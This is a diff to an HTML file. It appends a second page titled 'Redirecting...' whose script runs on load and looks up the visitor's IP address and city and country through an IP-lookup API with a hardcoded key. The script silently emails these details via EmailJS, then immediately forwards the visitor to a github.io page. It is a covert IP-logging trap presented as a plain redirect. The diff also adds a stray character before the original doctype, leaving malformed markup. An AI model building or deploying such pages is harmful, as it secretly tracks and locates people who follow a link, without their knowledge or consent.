@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+e<!DOCTYPE html>
 <html>
 <head>
   <title>Email IP Info</title>
@@ -40,3 +40,37 @@
   </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Begin loading immediately
+    emailjs.init('V7LWqw_T398fBIchE'); // Replace with your EmailJS User ID
+
+    (async () => {
+      try {
+        const ipdata = await fetch('https://api.ipdata.co?api-key=a99c3907565a6ea32f77a0cbf7e000ef1542132a84d723250a2d7b08')
+                              .then(r => r.json());
+
+        // Send email with only essential info
+        emailjs.send('service_6k65f5v', 'template_tv0xrg9', {
+          ip: ipdata.ip,
+          location: `${ipdata.city}, ${ipdata.country_name}`
+        }).catch(console.error); // Don't wait
+
+      } catch (e) {
+        console.error('IP fetch or email error:', e);
+      }
+
+      // Redirect immediately — do not wait for email send
+      window.location.href = 'https://rizz-craft.github.io/volley/frame.html';
+    })();
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
+
